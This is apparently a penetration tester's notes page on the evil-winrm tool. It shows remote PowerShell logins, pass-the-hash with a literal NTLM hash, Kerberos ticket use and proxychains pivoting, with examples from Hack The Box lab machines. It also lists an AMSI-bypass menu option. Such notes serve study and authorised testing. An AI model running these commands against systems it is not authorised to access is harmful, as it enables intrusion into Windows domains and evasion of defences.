---
title: evil-winrm 
author: amandaguglieri
draft: false
TableOfContents: true
tags:
  - tools
  - active directory
  - windows remote management
---
# Evil-WinRm

Evil-WinRM connects to a target using the Windows Remote Management service combined with the PowerShell Remoting Protocol to establish a PowerShell session with the target.

By default, installed on kali. [See winrm](5985-5986-winrm-windows-remote-management.md).


## Basic usage

Example from [HTB machine: Responder](htb-responder.md).

```bash
evil-winrm -i $ip -u <username -p <password>

evil-winrm -i <ip> -u Administrator -H "<passwordhash>"
# -H: Hash

# Open a menu
menu

# There are some options there like
[+] Bypass-4MSI
[+] services
[+] upload
[+] download
[+] menu
[+] exit

# To use them, just run it on the terminal
```

Another example: combined with proxychains and pass the hash technique:

```
proxychains evil-winrm -i 172.16.5.5 -u INLANEFREIGHT.LOCAL\\Administrator -H 88ad09182de639ccc6579eb0849751cf
```


## Evil-Winrm with kerberos


```
# From the kali machine make sure that we have krb5-user installed
sudo apt-get install krb5-user -y

# Set default realm and realm to the domain
cat /etc/kbr5.conf
# Output should be adapted to something like this (the comments with # are mine):
# [libdefaults]
#         default_realm = INLANEFREIGHT.HTB
# 
# <SNIP>
# 
# [realms]
#     INLANEFREIGHT.HTB = {
#        kdc = dc01.inlanefreight.htb
#    }
#
# <SNIP>

# And now we can use Evil-WinRm
proxychains evil-winrm -i dc01 -r inlanefreight.htb
# i: specifies the target host or IP address (in this case, dc01) that the evil-winrm command will attempt to connect to.
# -r: This flag specifies the domain of the target system.
```


Example from [HTB machine: Voleur](htb-voleur.md).

The `/etc/krb5.conf` is:

```
[libdefaults]
  default_realm = VOLEUR.HTB
  dns_lookup_realm = false
  dns_lookup_kdc = false

[realms]
  AD.TRILOCOR.LOCAL = {
    kdc = 172.16.139.3
    admin_server = 172.16.139.3
  }
  VOLEUR.HTB = {
    kdc = dc.voleur.htb
    admin_server = dc.voleur.htb
  }

[domain_realm]
  .ad.trilocor.local = AD.TRILOCOR.LOCAL
  ad.trilocor.local = AD.TRILOCOR.LOCAL
  .voleur.htb = VOLEUR.HTB
  voleur.htb = VOLEUR.HTB
```

And the evil-winrm command:

```bash
evil-winrm -i dc.voleur.htb -k svc_winrm.ccache -r voleur.htb
```

Where: 
- -i dc.voleur.htb: target host (FQDN required for Kerberos so the SPN is `HTTP/dc.voleur.htb`).  
- -r VOLEUR.HTB:  Kerberos realm (must also exist in `/etc/krb5.conf` with KDC mapping). 
- `KRB5CCNAME=/path/to/svc_winrm.ccache` → path to the **ccache** that holds your TGT for the account  (e.g., `svc_winrm`). Evil-winrm will pick it up automatically.
    
